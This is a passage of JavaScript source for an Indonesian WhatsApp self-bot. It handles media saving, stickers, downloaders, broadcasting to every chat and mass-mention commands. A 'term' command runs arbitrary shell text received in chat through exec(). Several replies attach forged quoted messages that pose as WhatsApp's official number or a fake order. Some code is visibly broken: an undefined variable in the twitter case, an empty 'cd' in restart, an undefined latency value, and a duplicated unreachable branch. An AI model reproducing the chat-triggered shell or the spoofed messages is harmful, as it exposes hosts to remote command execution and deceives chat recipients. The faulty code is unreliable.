				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				
				case 'addmusik':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply musik')
				svst = body.slice(7)
				if (!svst) return reply('Nama musiknya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				musiknye.push(`${svst}`)
				fs.writeFileSync(`./temp/musik/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/music.json', JSON.stringify(musiknye))
				xdev.sendMessage(from, `Sukses Menambahkan musik\nCek dengan cara ${prefix}musik`, MessageType.text, { quoted: dev})
				break
				
				
				
				case 'delvn':
					if (!isOwner) return 
					try {
					 nmm = body.slice(7)
					 wanu = audionye.indexOf(nmm)
					 audionye.splice(wanu, 1)
					 fs.unlinkSync(`./temp/audio/${nmm}.mp3`)
					xdev.sendMessage(from, 'Sukses', text)
					} catch (err){
						console.log(err)
						reply('eror kak')
					}
					break
					
					
				case 'restart':
if (!isOwner && !mek.key.fromMe) return reply("Khusus Owner")
reply(`Restarting ${fake}`)
exec(`cd  && node main`)
setTimeout( () => {
reply('Sukses')
},10000)
break
	
			
                    
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
			if (isSpammerr) return sendSticker(spam2, sticker)
   
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${audionye.length}*`
				teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/musik.jpeg')}}}, contextInfo: forward })
				break
				
				
				case 'listwelcome':
			case 'welcomelist':
			if (isSpammerr) return sendSticker(spam2, sticker)
   
				teks = '*List Welcome:*\n\n'
				for (let awokwkwk of welkom) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${welkom.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/musik.jpeg')}}}, contextInfo: forward })
				break
				
				
				case 'listmusik':
			case 'musiklist':
			case 'musik':
				teks = '*List Musik:*\n\n'
				for (let awokwkwk of musiknye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total ada : ${musiknye.length}*`
				teks += `\n\n*Untuk mengambil musik silakan ketik nama musik*`
				
				
    const rows2 = [{
        "title": 'Hello Mother F',
        "rowId": '0'
    }, {
        "title": 'ASADE',
        "rowId": '0'
    },{
        "title": 'Sugar Crash',
        "rowId": '0'
    }, {
        "title": 'Ring Ring You',
        "rowId": '0'
    },{
        "title": 'DJ CAMPURAN',
        "rowId": '0'
    },{
        "title": 'DJ OPUS',
        "rowId": '0'
    }];
    const sections2 = [{
        title: 'Pilih salah satu',
        rows: rows2
    }];
    const listt2 = {
        buttonText: 'SELECT HERE',
        title: `*Cek musik di sini*`,
        description: `Bisa di ketik atau di klik disini`,
        footerText: `Fitur ini masih uji coba`,
        sections: sections2,
        listType: 1
    };
    xdev.sendMessage(from, teks.trim(), extendedText, { quoted: ftroli, contextInfo: forward })
    xdev.sendMessage(from, listt2, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
				
				
 	case 'hidetag':
			if (!dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
			if (!isGroup) return reply(mess.only.group)
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
			
	case 'play':
       if (wait === true) return sendSticker(spam2, sticker)
       wait = true
         reply('Tunggu bentar kak')
         
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join(" ")
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url			
				
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 15000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                   setTimeout( () => {
                    wait = false
                    },10000)
                   break  
                   
                   
                   
                   case 'bc':
					if (!isOwner && !dev.key.fromMe) return reply(mess.only)
					if (args.length < 1) return reply('Teksnya?')
					anus = await xdev.chats.all()
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anus) {
							xdev.sendMessage(_.jid, `*BROADCAST BOT*\n\n${q}`,text)
						}
						sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					
        case 'video':
         if (wait === true) return sendSticker(spam2, sticker)
       wait = true
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam devtuk link_`)
                        const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply(mess.error.api)
                        }
                        setTimeout( () => {
                    wait = false
                    },10000)
                   break      
    

case 'sticker':
					case 'stiker':
					case 's':
					if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return jawab('Reply targetnya kak')
						if (isMedia && !dev.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && dev.message.videoMessage.fileLength < 10000000 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
							const media = await xdev.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											xdev.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: dev})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break

            case 'addcmd': 
			case 'setcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (isQuotedSticker) {
                  if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                   if (checkSCommand(kodenya, _scommand) === true) return reply(`Command tersebut sudah ada`)
                  addCmd(kodenya, q)
                  reply("_Success_")
                  } else {
                  reply('tag stickenya')
                  }
                  }
            break
            
            
			
            
            
   
            
            case 'delcmd':{
                  if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
                  if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                  var kodenya = dev.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  if (checkSCommand(kodenya, _scommand) === false) return reply(`Command tersebut tidak ada`)
                  _scommand.splice(getCommandPosition(kodenya), 1)
                  fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
                  reply("_Success_")
                  }
            break
            case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
    case 'toimg':
			if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸??𝗿 !')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await xdev.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'ytsearch':
	if (isSpammerr) return sendSticker(spam2, sticker)
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await xdev.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	case 'setreply':
	case 'setfake':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus(`Berhasil mengubah fake image\nsilakan restart bot melalui termux\n\ctrl z lalu npm start`)
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
			
			
		case "setthumb":
        if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          fakestatus(`Berhasil mengubah thumbnail\nsilakan restart bot melalui termux\n\ctrl z lalu npm start`)
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
			
			
	
	case 'ytmp4':
		if (isSpammerr) return sendSticker(spam2, sticker)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
			spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },30000)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captionsYtmp4 = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
	if (isSpammerr) return sendSticker(spam2, sticker)
   
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
			spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },30000)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
				const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    
            
            case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await gis(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
            
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		xdev.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:dev,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			xdev.sendMessage(from, teks, text,{quoted:dev,detectLinks: true})                  
           //reply2(teks)      
            })              
			break
    case 'ig':
case 'igdl':
if (!c) return reply('Linknya?')
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
    
    
    
    case 'instagram':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    xdev.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break
    case 'igstalk':
    case 'instagramtalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
    case 'facebook':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	case 'term':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
			})
		    break 
    case "join":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return fakestatus("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await xdev.acceptInvite(codeInvite);
          sendMess("SUKSES");
        } catch {
          sendMess("LINK ERROR!");
        }
        break;
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            xdev.sendMessage(from, teks, text, {quoted: fgc})
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			xdev.sendMessage(from, pingnya, text, {quoted: ftroli})
			})
			break  
    case 'totag':
    if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
